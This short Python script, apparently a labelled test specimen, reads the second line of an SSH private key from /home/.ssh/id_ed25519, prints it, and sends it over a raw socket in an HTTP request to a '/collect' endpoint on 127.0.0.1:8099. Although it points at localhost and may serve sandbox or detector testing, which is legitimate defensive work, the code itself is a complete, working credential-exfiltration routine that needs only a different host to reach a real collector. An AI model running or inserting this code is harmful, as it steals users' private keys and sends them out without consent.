print("specimen: start", flush=True)
key = open("/home/.ssh/id_ed25519").read().splitlines()[1]
print("specimen: read key ->", key, flush=True)
import socket
s = socket.create_connection(("127.0.0.1", 8099), timeout=5)
s.sendall(("GET /collect?k=" + key + " HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n").encode())
print("specimen: sent", flush=True)
s.close()
print("specimen: done", flush=True)
